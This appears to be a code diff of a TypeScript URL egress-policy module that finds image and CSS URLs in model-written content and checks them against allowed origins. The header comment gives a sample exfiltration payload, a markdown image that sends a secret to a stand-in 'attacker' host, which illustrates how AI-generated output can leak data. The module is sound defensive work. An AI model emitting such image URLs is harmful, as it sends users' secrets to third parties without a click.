@@ -1,4 +1,4 @@
-// URL egress policy shared by the browser and the server (no imports, no I/O).
+// URL egress policy shared by the browser and the server (one sibling import, the CSS URL tokenizer; no I/O).
 //
 // Anything the model, a tool or a file can write into an answer, a document or a deck can carry data in a URL
 // (`![](https://attacker/p.png?d=<secret>)`): the browser fetches it with no click. This module is the one place that
@@ -11,6 +11,8 @@
 // Every URL is parsed with `new URL(src, appOrigin)`, the browser's own serialization, and compared by exact origin.
 // String tricks (suffix, prefix, userinfo, port, trailing dot, percent-encoded host, protocol-relative) therefore
 // cannot pass for an allowed host; anything unparsable fails closed.
+
+import { cssUrlsOf } from './cssUrls.ts'
 
 export type AllowedOrigin = { origin: string; pathPrefix?: string } // origin = 'https://host[:port]'
 export type EgressPolicy = { allowedOrigins: readonly AllowedOrigin[] }
@@ -203,33 +205,20 @@ function add(list: string[], url: string, appOrigin: string): void {
 
 const TAG = /<([a-z][\w:-]*)((?:[^<>"']|"[^"]*"|'[^']*')*)>/gi
 const ATTR = /([^\s"'<>/=]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/g
-const CSS_URL = /url\(\s*(?:"([^"]*)"|'([^']*)'|([^)\s"']*))\s*\)/gi
-const CSS_IMPORT = /@import\s+(?:"([^"]*)"|'([^']*)')/gi
 const LINK_TAGS = new Set(['a', 'area'])
 const LINK_ATTRS = new Set(['ping', 'action', 'formaction'])
 const URL_ATTRS = new Set(['src', 'href', 'xlink:href', 'poster', 'data', 'background', 'longdesc', 'icon'])
 
-/** CSS Syntax escapes: `\\6c ` (1-6 hex digits plus one optional space) and `\\x` (any other char), so `u\\72l(` reads `url(`. */
-function cssUnescape(s: string): string {
-  if (!s.includes('\\')) return s
-  // a backslash + newline (LF, CRLF, CR, FF) inside a quoted string is a continuation and vanishes; outside a string (an
-  // unquoted url()) it makes a bad-url token that loads nothing, so it is left alone
-  s = s.replace(/"(?:[^"\\\n\r\f]|\\(?:\r\n|[\s\S]))*"|'(?:[^'\\\n\r\f]|\\(?:\r\n|[\s\S]))*'/g, (str) => str.replace(/\\(?:\r\n|[\n\r\f])/g, ''))
-  return s.replace(/\\(?:([0-9a-f]{1,6})(?:\r\n|[ \t\n\r\f])?|([^\n\r\f0-9a-f]))/gi, (_all, hex: string | undefined, ch: string | undefined) => {
-    if (ch !== undefined) return ch
-    const cp = parseInt(hex as string, 16)
-    return cp === 0 || cp > 0x10ffff || (cp >= 0xd800 && cp <= 0xdfff) ? '\ufffd' : String.fromCodePoint(cp)
-  })
+function scanCss(raw: string, sink: Sink, appOrigin: string): void {
+  for (const u of cssUrlsOf(raw)) add(sink.images, u, appOrigin)
 }
 
-function scanCss(raw: string, sink: Sink, appOrigin: string): void {
-  const css = cssUnescape(raw)
-  for (const m of css.matchAll(CSS_URL)) add(sink.images, m[1] ?? m[2] ?? m[3] ?? '', appOrigin)
-  for (const m of css.matchAll(CSS_IMPORT)) add(sink.images, m[1] ?? m[2] ?? '', appOrigin)
-}
+const STYLE_ELEMENT = /<style\b[^<>]*>([\s\S]*?)(?:<\/style\b|$)/gi
 
 function scanHtml(html: string, sink: Sink, appOrigin: string): void {
-  scanCss(html, sink, appOrigin)
+  // a bare CSS value (no markup) is CSS; in markup only <style> bodies and style="" values are (stray quotes in text must not open a string)
+  if (!html.includes('<')) scanCss(html, sink, appOrigin)
+  else for (const m of html.matchAll(STYLE_ELEMENT)) scanCss(m[1] as string, sink, appOrigin)
   for (const t of html.matchAll(TAG)) {
     const tag = (t[1] as string).toLowerCase()
     for (const a of (t[2] as string).matchAll(ATTR)) {
